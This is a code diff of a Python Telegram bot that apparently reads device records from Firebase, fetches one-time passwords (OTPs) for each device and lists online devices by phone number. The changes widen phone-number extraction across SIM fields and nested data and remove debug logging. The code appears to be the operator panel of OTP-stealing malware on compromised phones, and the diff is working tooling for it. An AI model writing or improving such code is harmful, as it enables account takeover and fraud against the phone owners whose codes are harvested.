@@ -392,7 +392,7 @@ async def fetch_otps(url: str, key: str, dev_id: str):
     return otps, last_any_dt
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED resolve_phone() — 40+ keys + sim1-sim5 + nested + deep scan
+# ✅ FIXED resolve_phone() — SUPER DEEP SCAN (10 level tak)
 # ══════════════════════════════════════════════════════════════════════════════
 def resolve_phone(info: dict, dev_id: str = "") -> str:
     if not isinstance(info, dict): return "—"
@@ -405,6 +405,7 @@ def resolve_phone(info: dict, dev_id: str = "") -> str:
         return s
 
     candidates = []
+    # 1. Direct keys
     direct_keys = [
         "mobNo", "phoneNumber", "phone_number", "PhoneNumber", "phone",
         "mobile", "Mobile", "mob", "number", "Number", "msisdn",
@@ -413,56 +414,36 @@ def resolve_phone(info: dict, dev_id: str = "") -> str:
         "userPhone", "user_phone", "userMobile", "user_mobile",
         "senderNumber", "sender_number", "from", "sender", "address",
         "devicePhone", "device_phone", "deviceNumber", "device_number",
-        "simNo", "sim_no", "regNumber", "registeredNumber",
+        "simNo", "sim_no", "regNumber", "registeredNumber", "ph", "mob_no",
     ]
     for k in direct_keys:
         candidates.append(info.get(k))
 
-    for i in range(1, 6):
-        for sim_key in (f"sim{i}", f"SIM{i}", f"Sim{i}", f"sim_{i}", f"sim-{i}"):
-            sv = info.get(sim_key)
-            if isinstance(sv, dict):
-                candidates.extend([
-                    sv.get("number"), sv.get("phone"), sv.get("phoneNumber"),
-                    sv.get("mobNo"), sv.get("mobile"), sv.get("msisdn"),
-                    sv.get("phone_no"), sv.get("mobile_no"), sv.get("mob"),
-                ])
-            elif isinstance(sv, str) and sv.strip():
-                candidates.append(sv)
-
-    sims = info.get("sims") or info.get("SIMs") or info.get("sim") or info.get("Sims") or {}
-    if isinstance(sims, dict): sims = list(sims.values())
-    if isinstance(sims, list):
-        for s in sims:
-            if not isinstance(s, dict): continue
-            candidates.extend([
-                s.get("phoneNumber"), s.get("phone"), s.get("number"),
-                s.get("mobNo"), s.get("mobile"), s.get("msisdn"),
-                s.get("phone_no"), s.get("mobile_no"), s.get("mob"),
-                s.get("simNumber"), s.get("sim_number"),
-            ])
-
+    # 2. Nested objects
     for nest_key in ("device", "info", "data", "details", "meta",
                      "deviceInfo", "device_info", "simInfo", "sim_info",
                      "user", "profile", "contactInfo", "contact_info"):
         nest = info.get(nest_key)
         if isinstance(nest, dict):
-            candidates.extend([
-                nest.get("phone"), nest.get("phoneNumber"), nest.get("mobNo"),
-                nest.get("mobile"), nest.get("number"), nest.get("msisdn"),
-                nest.get("phone_no"), nest.get("mobile_no"),
-            ])
-            for i in range(1, 5):
-                sv2 = nest.get(f"sim{i}")
-                if isinstance(sv2, dict):
-                    candidates.extend([
-                        sv2.get("number"), sv2.get("phone"), sv2.get("mobNo"),
-                    ])
+            for k in direct_keys:
+                candidates.append(nest.get(k))
 
+    # 3. Sims array
+    sims = info.get("sims") or info.get("SIMs") or info.get("sim") or info.get("Sims") or {}
+    if isinstance(sims, dict): sims = list(sims.values())
+    if isinstance(sims, list):
+        for s in sims:
+            if isinstance(s, dict):
+                for k in direct_keys:
+                    candidates.append(s.get(k))
+            elif isinstance(s, str):
+                candidates.append(s)
+
+    # 4. SUPER DEEP SCAN (10 level tak)
     found_deep = ""
     def _deep_scan(d, depth=0):
         nonlocal found_deep
-        if found_deep or depth > 5: return
+        if found_deep or depth > 10: return
         if isinstance(d, dict):
             for k, v in d.items():
                 kl = str(k).lower()
@@ -481,6 +462,7 @@ def resolve_phone(info: dict, dev_id: str = "") -> str:
     _deep_scan(info)
     if found_deep: candidates.append(found_deep)
 
+    # Return cleaned number
     for c in candidates:
         s = _clean(c)
         if s:
@@ -493,7 +475,7 @@ def resolve_phone(info: dict, dev_id: str = "") -> str:
     return "—"
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED refresh_firebase() — debug log + name fallback
+# ✅ FIXED refresh_firebase()
 # ══════════════════════════════════════════════════════════════════════════════
 async def refresh_firebase(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
@@ -503,17 +485,9 @@ async def refresh_firebase(cfg: dict):
         return
 
     valid = []
-    no_phone_count = 0
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
         phone = resolve_phone(info, dev_id)
-        if phone == "—" and no_phone_count < 5:
-            no_phone_count += 1
-            logger.warning(
-                f"[{label}] NO PHONE for {dev_id[:10]} | "
-                f"Keys: {list(info.keys())} | "
-                f"Sample: {json.dumps(info, default=str)[:500]}"
-            )
         valid.append((dev_id, info, phone))
 
     async def _fetch_one(dev_id):
@@ -544,7 +518,7 @@ async def refresh_firebase(cfg: dict):
     fb_conn_status[label]  = "ok"
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED refresh_clients_only() — debug log + name fallback
+# ✅ FIXED refresh_clients_only()
 # ══════════════════════════════════════════════════════════════════════════════
 async def refresh_clients_only(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
@@ -553,17 +527,9 @@ async def refresh_clients_only(cfg: dict):
         fb_conn_status[label] = "error"
         return
     devs = {}
-    no_phone_count = 0
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
         phone = resolve_phone(info, dev_id)
-        if phone == "—" and no_phone_count < 5:
-            no_phone_count += 1
-            logger.warning(
-                f"[{label}] NO PHONE (clients_only) {dev_id[:10]} | "
-                f"Keys: {list(info.keys())} | "
-                f"Sample: {json.dumps(info, default=str)[:500]}"
-            )
         fb_status = bool(info.get("status") or info.get("isOnline") or info.get("is_online") or info.get("online"))
         ts_raw    = (info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline") or "")
         devs[dev_id] = {
@@ -653,7 +619,6 @@ def _normalize_phone(ph: str) -> str:
     if not pure.isdigit(): 
         return ph
         
-    # ✅ +91 ya 91 hata kar sirf 10 digit ka number return karo
     if len(pure) == 12 and pure.startswith("91"):
         return pure[2:]  
     if len(pure) == 10:
@@ -673,7 +638,7 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED all_online() — Duplicate hataye, par "No Number" wapas laaye
+# ✅ FIXED all_online() — Duplicate hataye, "No Number" wapas laaye
 # ══════════════════════════════════════════════════════════════════════════════
 def all_online() -> list:
     res = []
@@ -684,7 +649,6 @@ def all_online() -> list:
             if info.get("online"):
                 ph = info.get("phone") or "—"
                 
-                # Number nahi hai toh unique ID banake rakho taaki list se na hatae
                 if ph == "—" or not ph.strip():
                     ph_key = f"no_num_{did}" 
                 else:
@@ -840,7 +804,6 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
             ph = info.get("phone") or "—"
             esc  = lb.replace(":","_")
             
-            # Neela dabba (🟢) waisa hi hai, number nahi toh "No Number"
             display_num = ph if (ph and ph != "—") else "No Number"
             row.append(InlineKeyboardButton(f"🟢 {display_num}", callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
